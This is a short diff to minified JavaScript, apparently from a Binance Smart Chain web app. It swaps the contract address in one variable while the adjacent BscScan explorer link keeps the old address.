@@ -878,7 +878,7 @@
 			var K = n(408),
 				N = n(409),
 				q = 56,
-				X = "0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4",
+				X = "0xF9a4FF6CA0d31856C6fb300735986C71bdD16B7e",
 				_ = "https://www.bscscan.com/address/0xA2c0c4a842B84aFeBffe05A59F3ffc754AAD1ae4",
 				$ = Object(a.createContext)({
 					busdcontract: null,
